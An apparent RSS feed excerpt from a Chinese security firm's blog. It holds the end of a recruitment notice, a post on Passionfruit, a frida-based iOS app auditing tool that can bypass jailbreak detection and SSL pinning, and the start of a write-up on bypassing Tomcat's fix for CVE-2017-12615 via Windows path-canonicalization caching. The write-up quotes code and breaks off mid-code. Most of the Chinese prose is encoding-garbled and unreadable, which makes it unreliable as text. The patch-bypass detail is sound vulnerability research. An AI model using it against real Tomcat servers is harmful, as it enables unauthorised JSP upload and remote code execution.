ä¸ºæˆ‘ä»¬æœ‰è¶³å¤Ÿå¤šçš„è½¬è¡ŒæˆåŠŸæ¡ˆä¾‹ï¼Œä»–ä»¬æ¥è‡ªäºä¸åŒçš„ä¸“ä¸šï¼šæ•°å­¦ã€æ°´åˆ©ã€èˆªç©ºèˆªå¤©ã€èˆªæµ·ã€æœºæ¢°ç­‰ç­‰ç­‰ç­‰ï¼Œå“¦å·®ç‚¹å¿˜äº†ï¼Œè¿˜ã€‚ã€‚ã€‚è¿˜æœ‰ç§˜ä¹¦ä¸“ä¸šã€‚&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;åº”å±Šæ¯•ä¸šç”Ÿé€šè¿‡CROSSè®¡åˆ’ï¼š&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;1. è¿›å…¥é•¿äº­ç§‘æŠ€äº§å“ç ”å‘éƒ¨é—¨å®ä¹ &lt;/p&gt;&lt;p&gt;2. è·å¾—é•¿äº­æŠ€æœ¯å¤§ä½¬&lt;b&gt;1å¯¹1æŒ‡å¯¼&lt;/b&gt;çš„çè´µæœºä¼šï¼ˆCTOäº²è‡ªå‚ä¸ï¼‰&lt;/p&gt;&lt;p&gt;3. æ›´æœ‰æ¯•ä¸šåç›´æ¥è½¬æ­£çš„æœºä¼šï¼&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å‹æƒ…æç¤ºï¼š&lt;/p&gt;&lt;p&gt;é•¿äº­æ˜¯ä¸€ä¸ªå¯¹æŠ€æœ¯æœŸæœ›é¢‡é«˜çš„å›¢é˜Ÿï¼Œ&lt;/p&gt;&lt;p&gt;ç„¶è€Œæˆ‘ä»¬æ›´çœ‹é‡çš„ï¼Œ&lt;/p&gt;&lt;p&gt;æ˜¯ä½ æ€è€ƒé—®é¢˜çš„æ€è·¯ï¼Œ&lt;/p&gt;&lt;p&gt;çœ‹å¾…ä¸–ç•Œçš„è§’åº¦ï¼&lt;/p&gt;&lt;p&gt;å¦‚æœåˆšå¥½ä½ ä¹Ÿè¿™æ ·ï¼Œé‚£å°±æ¥å§ï¼&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;è®¡ç®—æœºä¸“ä¸šçš„åŒå­¦ä¹Ÿä¸è¦è‡ªå‘ï¼Œ&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;ç®€å†ä¹Ÿä¸ä¼šè¢«æ‰”å‡ºå»ï¼&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é™¤äº†ç ”å‘å²—ä½ï¼Œ&lt;b&gt;å¸‚åœºã€é”€å”®ã€æŠ€æœ¯æ”¯æŒ&lt;/b&gt;ç­‰å²—ä½ä¹Ÿåœ¨æœŸå¾…ä½ çš„åŠ å…¥ï¼å…·ä½“å²—ä½ä¿¡æ¯è¯·æˆ³é•¿äº­ç§‘æŠ€å®˜ç½‘ï¼ˆ&lt;a href=&quot;https://chaitin.cn/cn/join-us.html&quot;&gt;https://chaitin.cn/cn/join-us.html&lt;/a&gt;ï¼‰&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;ç®€å†æŠ•é€’ä¼ é€é—¨ï¼šhr@chaitin.com&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;é‚®ä»¶ä¸»é¢˜è¯·æ³¨æ˜ â€œCROSSè®¡åˆ’â€ï¼&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;æ¥ï¼&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>æœ±æ–‡é›·</author>
<guid isPermaLink="false">2017-10-27-30515472</guid>
<pubDate>Fri, 27 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>å¼€æºï¼iOS åº”ç”¨å®‰å…¨åˆ†æå·¥å…· Passionfruit</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-15-29761306.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;å¼€æºï¼iOS åº”ç”¨å®‰å…¨åˆ†æå·¥å…· Passionfruit&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29761306&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e590742eb8fe8628767544ef478ee70d_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;Github é¡¹ç›®åœ°å€ &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;chaitin/passionfruit&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;å‰æƒ…æè¦&lt;/h2&gt;&lt;p&gt;è™½ç„¶æ²¡æœ‰ Android å¹³å°é‚£ä¹ˆå¤šçš„æ”»å‡»é¢å’Œåˆ©ç”¨å§¿åŠ¿ï¼ŒiOS åº”ç”¨ä¾ç„¶æœ‰å®‰å…¨å®¡è®¡çš„éœ€æ±‚ã€‚ç§»åŠ¨å¹³å°çš„å®‰å…¨ç›®å‰é‡‡ç”¨çš„ç­–ç•¥åŸºæœ¬ä¸Šéƒ½æ˜¯æ‰«æå™¨åŠ ä¸Šä¸€éƒ¨åˆ†äººå·¥çš„é€†å‘å’ŒåŠ¨æ€åˆ†æã€‚&lt;/p&gt;&lt;p&gt;é’ˆå¯¹ iOS åº”ç”¨æ”»å‡»é¢åˆ†æï¼Œç›®å‰ç¬”è€…äº†è§£æˆ–ä½¿ç”¨è¿‡çš„ç›¸å…³å·¥å…·å¦‚ä¸‹ï¼ˆé™¤å»é€†å‘å·¥ç¨‹ä½¿ç”¨çš„è°ƒè¯•å™¨å’Œåæ±‡ç¼–å·¥å…·ï¼‰ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Snoop-Itï¼ˆå·²åœæ­¢ç»´æŠ¤ï¼‰&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/dmayer/idb&quot;&gt;dmayer/idb&lt;/a&gt; idb is a tool to simplify some common tasks for iOS pentesting and research&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/mwrlabs/needle&quot;&gt;mwrlabs/needle&lt;/a&gt; The iOS Security Testing Framework&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/sensepost/objection&quot;&gt;sensepost/objection&lt;/a&gt; ğŸ“± objection - runtime mobile exploration&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/iSECPartners/Introspy-iOS&quot;&gt;iSECPartners/Introspy-iOS&lt;/a&gt; IntroSpy&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;åœ¨ä½¿ç”¨ä¸­ç¬”è€…å¤šå¤šå°‘å°‘é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œä¾‹å¦‚ needle åœ¨è®¾å¤‡ä¸Šéœ€è¦éƒ¨ç½²è¿‡å¤šä¾èµ–åŒ…ï¼Œidb ä¸å…¼å®¹ iOS 10ï¼ŒIntrospy è™½å¥½ä½†æŸ¥è¯¢æ—¥å¿—æ•°æ®åº“æœ‰ä¸€äº›éº»çƒ¦â€¦â€¦å¿ä¸ä½å¼€å§‹é€ è½®å­ã€‚&lt;/p&gt;&lt;p&gt;å®¡è®¡å·¥å…·æ‰€éœ€åŠŸèƒ½å¤§ä½“æœ‰å¦‚ä¸‹å‡ ä¸ªæ–¹é¢ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;åˆ†æåº”ç”¨æ˜¯å¦å¼€å¯äº†å¿…è¦çš„ç¼–è¯‘å™¨ä¿æŠ¤&lt;/li&gt;&lt;li&gt;åˆ†æåº”ç”¨æ²™ç›’å†…çš„æ–‡ä»¶å†…å®¹å’Œæƒé™&lt;/li&gt;&lt;li&gt;åˆ†æåº”ç”¨ä½¿ç”¨åˆ°çš„ framework å’ŒåŠ¨æ€é“¾æ¥åº“&lt;/li&gt;&lt;li&gt;åˆ†æåº”ç”¨å­˜å‚¨çš„æ•°æ®ï¼Œå¦‚ UserDefaults, BinaryCookie å’Œ KeyChain&lt;/li&gt;&lt;li&gt;åˆ†æå‰ªè´´æ¿çš„ä½¿ç”¨&lt;/li&gt;&lt;li&gt;åŠ¨æ€æ‹¦æˆªå’Œåˆ†æ Objective C è¿è¡Œæ—¶æ–¹æ³•&lt;/li&gt;&lt;li&gt;åŠ¨æ€æ‹¦æˆªå’Œåˆ†ææœ¬åœ°ä»£ç çš„å‚æ•°è°ƒç”¨å’Œå †æ ˆè¿½è¸ª&lt;/li&gt;&lt;li&gt;åˆ†æ UIView çš„å±‚çº§ç»“æ„å’Œå±æ€§&lt;/li&gt;&lt;li&gt;ä¸€äº›åŸºäº hook å®ç°çš„ä¿®æ”¹åŠŸèƒ½ï¼Œå¦‚è®¾å¤‡ç‰¹å¾ä¼ªé€ ã€ç»•è¿‡è¶Šç‹±æ£€æµ‹ã€ç»•è¿‡ SSL Pinning ç­‰&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-869fa78c8cd0772eaf1d44711a7e471a_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1556&quot;&gt;&lt;p&gt;&lt;i&gt;åº”ç”¨ç›®å‰ä»ç„¶åœ¨å¼€å‘ä¸­ï¼Œå¯èƒ½ä¼šæœ‰ bug æˆ–åŠŸèƒ½ç¼ºå¤±ã€‚&lt;/i&gt;&lt;/p&gt;&lt;h2&gt;è®¾è®¡&lt;/h2&gt;&lt;p&gt;åœ¨å®ç°æ–¹æ¡ˆä¸Šï¼Œç¬”è€…é€‰æ‹©äº†åŠŸèƒ½æä¸ºå¼ºå¤§çš„ hook æ¡†æ¶ &lt;a href=&quot;https://www.frida.re/&quot;&gt;frida.re&lt;/a&gt;ã€‚å…³äºè¿™ä¸ªæ¡†æ¶ä¸éœ€è¦æˆ‘å†è¿‡å¤šä»‹ç»ï¼Œå®ƒåœ¨ iOS å¹³å°ä¸Šæ”¯æŒå¯¹ native å‡½æ•°ã€Objective C è¿è¡Œæ—¶çš„ hook å’Œè°ƒç”¨ï¼Œå¯ä»¥æ»¡è¶³å¤šç§ç§»åŠ¨å®‰å…¨è¿è¡Œæ—¶åˆ†æçš„è‡ªåŠ¨åŒ–éœ€æ±‚ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5b1570480dfb0ae145555cb3a44b73fe_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;817&quot; data-rawheight=&quot;318&quot;&gt;&lt;p&gt;Passionfruit é€šè¿‡ frida æ³¨å…¥ä»£ç åˆ°ç›®æ ‡åº”ç”¨å®ç°åŠŸèƒ½ï¼Œå†é€šè¿‡ node.js æœåŠ¡ç«¯æ¶ˆæ¯ä»£ç†ä¸æµè§ˆå™¨é€šä¿¡ï¼Œç”¨æˆ·é€šè¿‡è®¿é—®ç½‘é¡µå³å¯å¯¹ App å®ç°å¸¸è§„çš„æ£€æµ‹ä»»åŠ¡ã€‚&lt;/p&gt;&lt;h2&gt;å®‰è£…å’Œä½¿ç”¨&lt;/h2&gt;&lt;p&gt;è¯·è®¿é—® GitHub ä¸Šçš„é¡¹ç›®ä¸»é¡µ &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;chaitin/passionfruit&lt;/a&gt; æ¥è·å–æœ€æ–°çš„ç‰ˆæœ¬å’Œæ›´æ–°ä¿¡æ¯ã€‚&lt;/p&gt;&lt;p&gt;Passionfruit çš„ç¼–è¯‘å’Œå®‰è£…ä¾èµ–å¦‚ä¸‹è½¯ä»¶ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nodejs.org/&quot;&gt;node.js&lt;/a&gt; ç”¨äºè¿è¡ŒæœåŠ¡ç«¯ã€‚å¯æ ¹æ®ä¸ªäººå–œå¥½ä½¿ç”¨ &lt;a href=&quot;https://yarnpkg.com/&quot;&gt;yarn&lt;/a&gt; æˆ–é»˜è®¤çš„ &lt;a href=&quot;https://www.npmjs.com/&quot;&gt;npm&lt;/a&gt; ä½œä¸ºåŒ…ç®¡ç†&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/libimobiledevice/libimobiledevice&quot;&gt;libimobiledevice&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;å®‰è£…æ­¥éª¤&lt;/p&gt;&lt;ol&gt;&lt;li&gt;å®‰è£… node.js å’Œ libimobiledevice&lt;/li&gt;&lt;li&gt;é€šè¿‡ git å°†ä»£ç ä»“åº“åŒæ­¥åˆ°æœ¬åœ°&lt;/li&gt;&lt;li&gt;åœ¨è¶Šç‹± iOS è®¾å¤‡ä¸Šå®‰è£… frida&lt;/li&gt;&lt;li&gt;åœ¨éè¶Šç‹±è®¾å¤‡ä¸Šä½¿ç”¨ ipa é‡æ‰“åŒ…æ³¨å…¥ fridagadget.dylib&lt;/li&gt;&lt;li&gt;ç¬¬ä¸€æ¬¡ä½¿ç”¨å‰ï¼Œåœ¨ä»£ç æ ¹ç›®å½•è¿è¡Œ npm run build æ„å»ºå‰ç«¯ä»£ç &lt;/li&gt;&lt;li&gt;è¿è¡Œ npm start è¿è¡ŒæœåŠ¡ç«¯ï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—® localhost:31337&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;åŠŸèƒ½å’Œæ¼”ç¤º&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;video id=&quot;None&quot; data-swfurl=&quot;&quot; poster=&quot;https://pic2.zhimg.com/80/v2-2f92b2ec64b187be4cbcaa134b697131_b.jpg&quot; data-sourceurl=&quot;https://www.zhihu.com/video/902688743067090944&quot; data-name=&quot;&quot; data-video-id=&quot;&quot; data-video-playable=&quot;true&quot; data-lens-id=&quot;902688743067090944&quot;&gt;&lt;/video&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Passionfruit æœ€å¤§ç‰¹ç‚¹å°±æ˜¯åŸºäº Web çš„å›¾å½¢ç•Œé¢ã€‚å› æ­¤ä½ ç”šè‡³å¯ä»¥åœ¨ iPad Pro è¿™æ ·çš„ç§»åŠ¨è®¾å¤‡ä¸Šè®¿é—®è¿™ä¸ªå›¾å½¢ç•Œé¢â€¦â€¦ï¼ˆéœ€è¦ä¿®æ”¹æœåŠ¡ç«¯ç›‘å¬çš„é…ç½®ï¼‰&lt;/p&gt;&lt;p&gt;å®Œå…¨å›¾å½¢åŒ–çš„ç•Œé¢å¯ä»¥å¿«é€Ÿåœ°æ‰¾åˆ°éœ€è¦ hook çš„å‡½æ•°ã€‚ç”±äº C å‡½æ•°ç¼ºå°‘è¿è¡Œæ—¶å‚æ•°ç±»å‹ä¿¡æ¯ï¼Œå› æ­¤å¯¹äºè¿™äº›åº“å‡½æ•°æ‚¨éœ€è¦æ‰‹åŠ¨è®¾ç½®ä¸€ä¸‹å‡½æ•°åŸå‹ã€‚Objective C å¯ä»¥ç›´æ¥æ ¹æ®åå°„æ‰“å°å‡ºå‚æ•°å’Œè¿”å›å€¼ã€‚&lt;/p&gt;&lt;p&gt;å…¶ä»–å·¥å…·å®ç°çš„ checksec æ˜¯åŸºäº otool æ£€æŸ¥åº”ç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œéœ€è¦åœ¨è®¾å¤‡ä¸Šå®‰è£…é¢å¤–çš„ä¾èµ–ï¼Œæˆ–å°†æ–‡ä»¶ä»è®¾å¤‡ä¸­åŒæ­¥åˆ°æœ¬åœ°æ‰§è¡Œå‘½ä»¤ã€‚Passionfruit ç›´æ¥åˆ†æå†…å­˜ä¸­æ˜ å°„çš„å†…å®¹ï¼Œå› æ­¤è¦å¿«ä¸Šå¾ˆå¤šã€‚åœ¨æ–‡ä»¶æŸ¥çœ‹æ–¹é¢ï¼ŒPassionfruit ç›´æ¥è¯»å–åº”ç”¨æ²™ç›’å†…çš„ Plistã€SQLite æ•°æ®åº“ï¼Œç›¸æ¯”å…ˆ scp ä¸‹è½½ç„¶åæŸ¥çœ‹å¯ä»¥èŠ‚çº¦ä¸€äº›æ—¶é—´ã€‚&lt;/p&gt;&lt;p&gt;Passionfruit åœ¨ä¸å°‘ç•Œé¢éƒ½æ·»åŠ äº†æœç´¢åŠŸèƒ½ï¼Œå¦‚æ¨¡å—åˆ—è¡¨ã€å¯¼å‡ºç¬¦å·ã€Objective C ç±»ï¼Œç”šè‡³ Plist è¿™æ ·çš„åºåˆ—åŒ–æ•°æ®ã€‚&lt;/p&gt;&lt;p&gt;åœ¨ iOS 10 ä¸­æœ‰ä¸€ä¸ªéå…¬å¼€ API UIDebuggingInformationOverlay å¯ç”¨æ¥åœ¨è®¾å¤‡ä¸Šåˆ†æç•Œé¢å±‚çº§ï¼Œæ‚¨å¯ä»¥åœ¨ Passionfruit çš„ UIDump é¢æ¿ä¸­ç‚¹å‡»æŒ‰é’®æ¥æ¿€æ´»è¿™ä¸ªç•Œé¢ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5dac5ae80092b44c7e266b9aa4937a67_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;p&gt;å¦‚æœæ‚¨æœ‰å•æ­¥ã€ç•Œé¢åˆ†æç­‰æ›´é«˜çº§çš„è°ƒè¯•éœ€æ±‚ï¼Œå»ºè®®è¿˜æ˜¯ä½¿ç”¨ debugserver ç­‰ä¸“é—¨çš„è°ƒè¯•å·¥å…·ã€‚&lt;/p&gt;&lt;h2&gt;FAQ&lt;/h2&gt;&lt;p&gt;&lt;b&gt;éœ€è¦è¶Šç‹±å—ï¼Ÿ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;æ›´æ–°ï¼šé¡¹ç›®å‘å¸ƒåæ”¶åˆ°äº† frida ä½œè€…æœ¬å°Šè´¡çŒ®çš„ä»£ç ï¼Œç°åœ¨å·²ç»ä¸éœ€è¦è¶Šç‹±äº†ï¼&lt;/p&gt;&lt;p&gt;Frida å¯ä»¥é€šè¿‡å¯¹å·²ç ¸å£³çš„ ipa æ·»åŠ  fridagadget.dylibï¼Œé‡æ‰“åŒ…ã€é‡ç­¾åååœ¨éè¶Šç‹±è®¾å¤‡ä¸Šè¯•ç”¨ï¼Œå…·ä½“æ­¥éª¤å¯å‚è€ƒï¼š &lt;a href=&quot;http://www.jianshu.com/p/ce2770c42ead&quot;&gt;iOS Appçš„Patchingå’ŒResigning&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;ä¸ºä»€ä¹ˆä¸æ”¯æŒ NSLog æŸ¥çœ‹ï¼Ÿ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;æœ¬å·¥å…·ä½¿ç”¨çš„ç•Œé¢æ˜¯åŸºäºæµè§ˆå™¨çš„ï¼Œå¯¹äº NSLog æ—¥å¿—è¿™ç§å¿«é€Ÿåˆ·æ–°çš„å†…å®¹ï¼Œå®æ—¶å±•ç¤ºä¼šé€ æˆæ˜¾è‘—çš„æ€§èƒ½é—®é¢˜ã€‚åœ¨ç°æœ‰å·¥å…·ï¼ˆXcodeï¼ŒmacOS è‡ªå¸¦çš„ Consoleï¼Œlibimoviledevice çš„ idevicesyslog å‘½ä»¤ï¼‰è¶³å¤Ÿå¼ºå¤§çš„æƒ…å†µä¸‹ï¼Œæ²¡æœ‰å¿…è¦å†å¼€å‘ä¸€ä¸ªï¼ˆæ›´éš¾ç”¨çš„ï¼‰äº†ã€‚&lt;/p&gt;</description>
<author>å‘¨çŸ¥æ—¥</author>
<guid isPermaLink="false">2017-10-15-29761306</guid>
<pubDate>Sun, 15 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Abuse Cache of WinNTFileSystem : Yet Another Bypass of Tomcat CVE-2017-12615</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-09-25-29649377.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Abuse Cache of WinNTFileSystem : Yet Another Bypass of Tomcat CVE-2017-12615&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29649377&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-30037f9018107abef8aa559996cbb61b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;ä½œè€…ï¼šPocky &lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 CVE-2017-12615 è¡¥ä¸åˆ†æ&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;CVE-2017-12615 æ˜¯ Tomcat åœ¨è®¾ç½®äº† readonly ä¸º false çŠ¶æ€ä¸‹ï¼Œå¯ä»¥é€šè¿‡ PUT åˆ›å»ºä¸€ä¸ªâ€œ.jsp â€çš„æ–‡ä»¶ã€‚ç”±äºåç¼€åé .jsp å’Œ .jspx ï¼Œæ‰€ä»¥ Tomcat åœ¨å¤„ç†çš„æ—¶å€™ç»ç”± DefaultServlet å¤„ç†è€Œä¸æ˜¯ JspServlet ï¼Œåˆç”±äº Windows ä¸å…è®¸æ–‡ä»¶åä¸ºç©ºæ ¼ç»“å°¾ï¼Œæ‰€ä»¥å¯ä»¥æˆåŠŸåˆ›å»ºä¸€ä¸ª JSP æ–‡ä»¶ï¼Œä»¥è¾¾åˆ° RCE çš„ç»“æœã€‚  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é¾™å“¥åœ¨å‘¨äº”æ•²æˆ‘è¯´ï¼Œåœ¨é«˜å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œè¿˜æ˜¯å¯ä»¥æˆåŠŸå†™å…¥ä¸€ä¸ª JSP æ–‡ä»¶ï¼›åŒæ—¶å¾®åšä¸Šçš„ä¸€ä¸ªå°ä¼™ä¼´ä¹Ÿå‘Šè¯‰æˆ‘ï¼Œåœ¨ä¸€å®šçš„æ¡ä»¶ä¸‹è¿˜æ˜¯å¯ä»¥æˆåŠŸåˆ›å»ºæ–‡ä»¶ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;æµ‹è¯•å‘ç°ï¼Œå¯¹äº 7.0.81 å¯ä»¥æˆåŠŸå¤ç°ï¼Œä½†æ˜¯å¯¹äº 8.5.21 å¤±è´¥ã€‚å¦‚ä¸‹ä»£ç åˆ†ææ˜¯åŸºäº Apache Tomcat 7.0.81 çš„ã€‚&lt;/b&gt;ç»è¿‡åˆ†æï¼Œæˆ‘å‘ç°è¿™ä¸¤ç§æƒ…å†µå…¶å®æœ¬è´¨æ˜¯ç›¸åŒçš„ã€‚ä¸è¿‡åœ¨æ­¤ä¹‹å‰ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹ Tomcat å¯¹äº CVE-2017-12615 çš„è¡¥ä¸å¥½äº†ã€‚  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;åŒæ ·çš„ï¼Œè¿›å…¥ DefaultServlet çš„ doPut æ–¹æ³•ï¼Œå†è°ƒç”¨åˆ° FileDirContext çš„ bind æ–¹æ³•ï¼Œæ¥ç€è°ƒç”¨ file æ–¹æ³•ï¼š  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected File file(String name, boolean mustExist) {
        File file = new File(base, name);
        return validate(file, mustExist, absoluteBase);
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ³¨æ„åˆ° mustExist ä¸º false ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected File validate(File file, boolean mustExist, String absoluteBase) {
    
        if (!mustExist || file.exists() &amp;amp;&amp;amp; file.canRead()) { // !mustExist = trueï¼Œè¿›å…¥ if
            ...
            try {
                canPath = file.getCanonicalPath(); 
                // æ­¤å¤„ï¼Œå¯¹è·¯å¾„è¿›è¡Œè§„èŒƒåŒ–ï¼Œè°ƒç”¨çš„æ˜¯ java.io.File å†…çš„æ–¹æ³•
                // ä¹‹å‰çš„ Payload ä¸­ç»“å°¾ä¸ºç©ºæ ¼ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å°±ä¼šå»æ‰ç©ºæ ¼
            } catch (IOException e) {
    
            }
            ...
            if ((absoluteBase.length() &amp;lt; absPath.length())
                &amp;amp;&amp;amp; (absoluteBase.length() &amp;lt; canPath.length())) {
                ...
                // åˆ¤æ–­è§„èŒƒåŒ–çš„è·¯å¾„ä»¥åŠä¼ å…¥çš„è·¯å¾„æ˜¯å¦ç›¸ç­‰ï¼Œç”±äº canPath æ²¡æœ‰ç©ºæ ¼ï¼Œreturn null
                if (!canPath.equals(absPath))
                    return null;
            }
        } else {
            return null;
        }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ç»è¿‡ä¸Šè¿°çš„åˆ¤æ–­ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•é€šè¿‡ç©ºæ ¼æ¥åˆ›å»º JSP æ–‡ä»¶ã€‚  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ä½†æ˜¯ä¹‹å‰æåˆ°ï¼Œåœ¨é«˜å¹¶å‘æˆ–è€…å¦å¤–ä¸€ç§æƒ…å†µä¸‹ï¼Œå´åˆèƒ½åˆ›å»º JSP æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ canPath.equals(absPath) ä¸º true ã€‚é€šè¿‡æ·±å…¥åˆ†æï¼Œæ‰¾å‡ºäº†å…¶åŸå› ã€‚  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x02 WinNTFileSystem.canonicalize &lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ä¸Šè¿°ä»£ç ä¸­ï¼Œå¯¹äºè·¯å¾„çš„è§„èŒƒåŒ–æ˜¯è°ƒç”¨çš„ file.getCanonicalPath() ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   public String getCanonicalPath() throws IOException {
        if (isInvalid()) {
            throw new IOException(&quot;Invalid file path&quot;);
        }
        return fs.canonicalize(fs.resolve(this));
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ä¹Ÿå°±æ˜¯è°ƒç”¨ FS çš„ canonicalize æ–¹æ³•ï¼Œå¯¹äº Windowsï¼Œè°ƒç”¨çš„æ˜¯ WinNTFileSystem.canonicalize ã€‚è¿™ä¸ª Bypass çš„é”…ä¹Ÿå°±å‡ºåœ¨ WinNTFileSystem.canonicalize é‡Œï¼Œä¸‹é¢ä¸ºå…¶ä»£ç ï¼Œæˆ‘å·²å»å¤„æ‰äº†æ— å…³ä»£ç å¯ä»¥æ›´æ¸…æ™°çš„äº†è§£åŸå› ã€‚ &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
    public String canonicalize(String path) throws IOException {
        ...
        if (!useCanonCaches) { // !useCanonCaches = false
            return canonicalize0(path);
        } else {
            // è¿›å…¥æ­¤å¤„åˆ†æ”¯
            String res = cache.get(path);
            if (res == null) {
                String dir = null;
                String resDir = null;
                if (useCanonPrefixCache) {
                    dir = parentOrNull(path);
                    if (dir != null) {
                        resDir = prefixCache.get(dir);
                        if (resDir != null) {
                            String filename = path.substring(1 + dir.length());
                            // æ­¤å¤„ canonicalizeWithPrefix ä¸ä¼šå»æ‰å°¾éƒ¨ç©ºæ ¼
                            res = canonicalizeWithPrefix(resDir, filename);
                            cache.put(dir + File.separatorChar + filename, res);
                        }
                    }
                }
                if (res == null) {
                    // æ­¤å¤„çš„ canonicalize0 ä¼šå°†å°¾éƒ¨ç©ºæ ¼å»æ‰
                    res = canonicalize0(path);
                    cache.put(path, res);
                    if (useCanonPrefixCache &amp;amp;&amp;amp; dir != null) {
                        resDir = parentOrNull(res);
                        if (resDir != null) {
                            File f = new File(res);
                            if (f.exists() &amp;amp;&amp;amp; !f.isDirectory()) {
                                prefixCache.put(dir, resDir);
                            }
                        }
                    }
                }
            }
            // è¿”å›è·¯å¾„
            return res;
        }
